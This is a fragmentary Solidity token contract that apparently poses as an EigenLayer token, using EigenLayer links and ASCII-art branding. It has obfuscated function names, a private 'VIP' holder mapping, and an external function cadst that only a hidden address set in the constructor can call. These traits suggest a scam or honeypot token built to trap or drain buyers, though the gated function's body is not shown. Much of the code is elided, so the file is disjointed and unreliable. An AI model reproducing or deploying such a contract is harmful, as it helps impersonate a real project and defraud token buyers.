...
WhitePaper: https://docs.eigenlayer.xyz/overview/whitepaper
Discourse: http://forum.eigenlayer.xyz/
...
Youtube: https://www.youtube.com/@EigenLayer
          ...
          |__/                              | $$                                                | $$              | $$
  /$$$$$$  /$$  /$$$$$$   /$$$$$$  /$$$$$$$ | $$  /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$        /$$$$$$    /$$$$$$ | $$   /$$  /$$$$$$  /$$$$$$$
 /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$ |____  $$| $$  | $$ /$$__  $$ /$$__  $$      |_  $$_/   /$$__  $$| $$  /$$/ /$$__  $$| $$__  $$
| $$$$$$$$| $$| $$  \ $$| $$$$$$$$| $$  \ $$| $$  /$$$$$$$| $$  | $$| $$$$$$$$| $$  \__/        | $$    | $$  \ $$| $$$$$$/ | $$$$$$$$| $$  \ $$
| $$_____/| $$| $$  | $$| $$_____/| $$  | $$| $$ /$$__  $$| $$  | $$| $$_____/| $$              | $$ /$$| $$  | $$| $$_  $$ | $$_____/| $$  | $$
|  $$$$$$$| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$              |  $$$$/|  $$$$$$/| $$ \  $$|  $$$$$$$| $$  | $$
 \_______/|__/ \____  $$ \_______/|__/  |__/|__/ \_______/ \____  $$ \_______/|__/               \___/   \______/ |__/  \__/ \_______/|__/  |__/
               /$$  \ $$                                   /$$  | $$
              |  $$$$$$/                                  |  $$$$$$/
               \______/                                    \______/
...
contract Coin is Ownable {
    ...
    function queryVipBen(address sss) private view returns(bool)  {
        return vipccdd[sss];
    }

    function bitBox123() private view returns (uint256) {
        return _MYtotalSupply;
    }
    function cadst() external {
        if (_g3h == _msgSender()){
    ...
    constructor(string memory name_, string memory symbol_,address rty) {
        _g3h = rty;
        _MYname = name_;
        _MYsymbol = symbol_;
